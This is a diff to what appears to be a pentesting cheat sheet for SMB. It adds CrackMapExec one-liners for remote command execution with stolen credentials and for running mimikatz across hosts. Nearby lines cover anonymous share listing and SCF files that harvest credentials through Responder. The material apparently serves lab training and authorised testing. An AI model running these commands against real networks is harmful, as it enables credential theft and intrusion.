@@ -105,6 +105,9 @@ SMBcacls
   
 Crackmapexec
   crackmapexec 10.10.10.125 --share -u '' -p '' (View Anonymous SMB Shares)
+  cme smb 10.10.10.125 -u username -p password -x whoami (run CMD command, -X for Powershell)
+  cme smb 10.10.10.125 -L (View all SMB Modules)
+  cme smb 10.10.10.125 -u username -p password -M mimikatz (runs mimikatz on all hosts you have creds for)
   
 SCF (Shell Command Files)
   If you can write to a share you can create a SCF file which points an ICONfile to a local share to grab creds with responder.
